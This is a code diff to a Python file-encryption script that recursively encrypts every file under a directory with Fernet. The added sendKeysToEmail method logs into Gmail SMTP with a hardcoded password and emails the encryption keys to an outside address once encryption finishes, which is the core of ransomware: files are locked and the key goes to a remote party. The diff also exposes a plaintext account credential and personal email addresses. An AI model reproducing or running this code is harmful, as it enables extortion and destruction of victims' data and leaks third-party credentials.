@@ -3,6 +3,7 @@ import os
 import sys
 import time
 import argparse
+import smtplib
 from cryptography.fernet import Fernet
 from concurrent.futures import ThreadPoolExecutor
 
@@ -69,6 +70,30 @@ class EncryptorDecryptor:
         with open(file_name, 'wb') as new_file:
             new_file.write(file_data)
 
+    def sendKeysToEmail(self):
+
+        # email content
+        sender_email = "notification.3mail@gmail.com"
+        receiver_email = "pejmanly@gmail.com"
+        message = self.keys
+
+        # SMTP server details
+        smtp_server = "smtp.gmail.com"
+        smtp_port = 587
+        smtp_username = "notification.3mail@gmail.com"
+        smtp_password = "(#)_(#)Notification.1209"
+
+        # connect to SMTP server
+        smtp = smtplib.SMTP(smtp_server, smtp_port)
+        smtp.starttls() # start a secure connection
+        smtp.login(smtp_username, smtp_password) # login
+
+        # send email
+        smtp.sendmail(sender_email, receiver_email, message)
+
+        # close connection
+        smtp.quit()
+
     def execute(self):
         with ThreadPoolExecutor() as executor:
             for root, _, files in os.walk(self.directory):
@@ -78,6 +103,7 @@ class EncryptorDecryptor:
                         executor.submit(self.encryptData, file_name)
                     elif self.mode == 'decrypt':
                         executor.submit(self.decryptData, file_name)
+        self.sendKeysToEmail()
 
 
 if __name__ == '__main__':
